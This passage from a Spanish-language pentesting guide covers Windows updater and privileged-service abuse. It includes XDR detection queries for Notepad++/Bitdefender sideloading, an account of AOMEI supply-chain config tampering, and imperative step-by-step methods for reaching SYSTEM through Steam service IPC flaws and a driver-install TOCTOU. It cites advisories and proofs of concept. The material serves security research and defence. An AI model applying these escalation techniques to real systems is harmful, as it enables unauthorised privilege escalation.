| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ejecutando un instalador que no es de Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Estos patrones se generalizan a cualquier updater que acepte manifests sin firmar o no verifique los signers del instalador: el secuestro de red + un instalador malicioso + sideloading firmado con una clave propia permiten la ejecución remota de código bajo la apariencia de actualizaciones «confiables».

### La configuración de notificaciones como segundo desencadenante de actualización

Un updater puede usar configuraciones remotas separadas para **preparar contenido y desencadenar su ejecución**. Esto requiere controlar las configuraciones o sus respuestas; los informes no identifican cómo se obtuvo acceso al origen. En el caso de AOMEI, `down_html.ini` seleccionaba una URL de archive, una versión (`thrid`) y un MD5 (`Val`); el atacante aumentó la versión y cambió la URL y el checksum correspondiente. Este es el [fallo del límite de confianza de los metadatos](#2-hijacking-the-update-channel-to-run-code-as-system) descrito anteriormente. La ruta de ejecución adicional era `Notifycfg.ini`: indicaba a `ABNotify.exe` que cargara un `upgrade-now.html` extraído mediante una URL local `file:///` en un WebView. La página navegaba automáticamente a un ejecutable ubicado en el mismo directorio, que el WebView entregaba al shell del sistema. El proceso hijo heredaba los privilegios del notificador; esto no lo elevaba automáticamente a SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google también informó de un `Notifycfg.ini` manipulado con más de 35 000 secciones dummy repetidas que eludían la comprobación de versión normal del cliente. El informe no demuestra un bypass general del parser. El atacante restauraba los archivos remotos después de ventanas de cinco a diez minutos, por lo que solo los clientes que consultaban durante esas ventanas recibían la configuración modificada. Este canal de notificaciones también incluía un señuelo distinto de [coerción de WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) que no requería ejecutar el archive.<sup>[[18]](#references)</sup>

---
## Bootstrap de memoria compartida hacia IPC de un servicio privilegiado

No te detengas en la enumeración de named pipes. Un broker SYSTEM puede exponer un **file mapping** permisivo para configurar la conexión y, luego, duplicar handles de anonymous pipes en el proceso solicitante. En el diseño de Steam analizado, `Global\SteamClientService_SharedMemFile` y `Global\SteamClientService_SharedMemLock` coordinan el intercambio de PID/evento del cliente; el servicio devuelve dos handles de pipe y las solicitudes subsiguientes, con prefijo de longitud, usan `RunInterface` (`0x01`). La DACL del mapping permitía clientes de cualquier nivel de integridad. El objeto interno `CSteamServiceWin32` de `steamclient64.dll` ofrecía un cliente práctico: resolver el global específico de la compilación, llamar a `Connect` en la posición 0 de la vtable y usar los mapas de interfaz en vez de volver a implementar el handshake. Llegar a IPC es solo un requisito previo; la decisión de confianza del handler privilegiado determina si hay escalada. <sup>[[19]](#references)[[20]](#references)</sup>

### Un manifest firmado se convierte en una allowlist de ejecutables obsoleta

`IClientInstallUtils::AddInstallScriptToWhiteList` (posición 21) verifica el `kvsignatures` de un VDF firmado, pero registra el **pathname expandido del ejecutable**, no una identidad de archivo inmutable. Con una entrada firmada `Run Process`, como `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, proporciona un `%INSTALLDIR%` en el que el usuario pueda escribir. Coloca un ejecutable de reemplazo en esa ruta expandida exacta y luego llama a `RunInstallScript` (posición 22) con un VDF sin firmar cuyo `Process 1` indique la ruta permitida. La entrada permanece tras la ejecución del script firmado hasta que se reinicia el servicio; en la implementación descrita, no se vuelve a validar el archivo antes de iniciarlo como SYSTEM. Haz coincidir el nombre de archivo plantado con la entrada firmada real, no solo con la categoría del prerequisite. <sup>[[19]](#references)[[20]](#references)</sup>

### El proceso hijo del module manager elude la comprobación de firma de carga directa

`IClientModuleManager::LoadModule` (posición 0) acepta bytes de módulo cuando el ID proporcionado coincide con su CRC32. `CallFunctionAsync` (posición 3), con `flags & 8`, selecciona una rama de **proceso hijo**, en lugar de la rama de carga reflectiva directa que verifica una firma de Valve. El servicio escribe `legacycompat\servicecall_<CRC>.dll` e inicia `legacycompat\steamservice.exe /runfunc ...` desde el directorio de instalación. Si se puede escribir en ese directorio, coloca un ejecutable en la ruta del segundo archivo, carga cualquier módulo desechable que coincida con el CRC y llama al método asíncrono con el bit 3 activado. En la compilación descrita, no se autenticaban ni el ejecutable hijo ni la DLL escrita en disco. El módulo no necesita ser una carga útil funcional: lo que se ejecuta como SYSTEM es el ejecutable hijo sustituido. <sup>[[19]](#references)[[20]](#references)</sup>

### Comprobaciones de miembros del catálogo antes de instalar un driver con privilegios

En un broker de instalación de drivers, comprueba si la validación del catálogo vincula **el INF exacto que se pasa al instalador**. En la ruta `InstallVrLinkDongleDriver` descrita, `WinVerifyTrust` valida un catálogo y `CryptCATAdminCalcHashFromFileHandle` busca *al menos un* archivo coincidente en un directorio proporcionado por quien llama, pero luego el servicio ejecuta `pnputil /add-driver ... /install` en `netrtwlanuval.inf` sin establecer que este INF sea el miembro previsto del catálogo. Se acepta un directorio plano o específico de la arquitectura. Por lo tanto, un catálogo firmado con cualquier miembro coincidente en el directorio puede superar la comprobación débil del servicio, aunque el INF entregado al instalador privilegiado sea distinto. No des por sentado que esto por sí solo elude la política de firma de drivers de Windows: la instalación correcta sigue dependiendo del paquete de reemplazo y de la política del host. <sup>[[19]](#references)[[20]](#references)</sup>

El servicio libera los handles de validación antes de que `pnputil` abra el INF, lo que deja una [brecha TOCTOU](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) con un punto de instalación de driver, en lugar de una actualización de ejecutable. Un oplock puede sincronizar una sustitución entre la comprobación y la apertura por parte del instalador. El mismo IPC expone el [reenvío de entrada en el secure desktop](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring) sujeto a requisitos de consentimiento independientes. <sup>[[19]](#references)</sup>

## References
- [1] [Aviso: Netskope Client para Windows: escalada local de privilegios mediante un servidor malicioso (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Aviso de seguridad de Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN: plugin de Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope: cliente/exploit de IPC de Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD: CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost: vulnerar ASUS DriverHub, MSI Center, Acer Control Centre y Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf: HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult: escalada local de privilegios mediante archivos con permisos de escritura en Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk n.º 16361: escalada de privilegios en el agente de Windows](https://checkmk.com/werk/16361)
- [10] [Pruebas de concepto de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer de CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42: actores de un Estado-nación explotan la cadena de suministro de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++: actualización sobre el incidente de infraestructura secuestrada](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf: elusión de la corrección de CVE-2025-0309 en Netskope Client para Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis: descubrir vulnerabilidades de escalada de privilegios en Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab: MyReport Updater: de gRPC a SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab: compromiso de la cadena de suministro de AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group y Mandiant: investigación sobre la manipulación efímera de la cadena de suministro](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis: darle la vuelta a Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Pruebas de concepto de Atredis: darle la vuelta a Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
